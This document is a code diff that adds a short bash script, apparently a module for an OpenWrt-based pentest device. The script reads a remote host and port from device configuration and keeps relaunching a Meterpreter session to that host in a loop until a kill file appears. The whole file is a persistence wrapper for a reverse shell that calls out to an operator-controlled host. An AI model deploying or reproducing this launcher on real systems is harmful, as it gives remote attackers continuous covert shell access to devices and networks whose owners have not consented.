@@ -1,0 +1,20 @@
+#!/bin/bash
+rm /tmp/killmeterpreter
+DATE=$(date)
+IP=$(uci get meterpreter.host)
+PORT=$(uci get meterpreter.port)
+DIR="$( cd "$( dirname "${BASH_SOURCE[0]}" )" && pwd )"
+[[ "$IP" == "" || "$PORT" == "" ]] && { 
+logger "Meterpreter: Error, configuration blank"
+echo "Meterpreter: Error, configuration blank"
+} || {
+while [ ! -f /tmp/killmeterpreter ]; do
+echo "Started Meterpreter at $DATE with $IP $PORT"
+logger "Meterpreter: Started at $DATE with $IP $PORT"
+/usr/bin/meterpreter $IP $PORT
+done
+rm /tmp/killmeterpreter
+echo "Stopped Meterpreter at $DATE with $IP $PORT"
+logger "Meterpreter: Stopped at $DATE with $IP $PORT"
+}
+
